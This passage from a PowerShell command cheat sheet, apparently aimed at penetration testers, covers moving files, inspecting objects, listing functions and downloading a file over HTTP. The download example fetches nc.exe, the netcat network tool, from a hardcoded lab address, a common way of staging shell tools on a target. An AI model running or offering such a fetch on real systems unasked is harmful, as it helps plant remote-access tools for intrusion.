### **Move a File**
To move or rene a file (similar to `mv` or `move`):
```powershell
PS C:\> Move-Item src.txt dst.txt
```

### **Show Properties and Methods**
To display the properties and methods of an object:
```powershell
PS C:\> Get-Member
```

### **Download a File via HTTP**
To download a file using HTTP (similar to `wget`):
```powershell
PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe", "nc.exe")
```

### **List Loaded Functions**
To list all loaded functions in the current PowerShell session:
```powershell
PS C:\> ls function:
```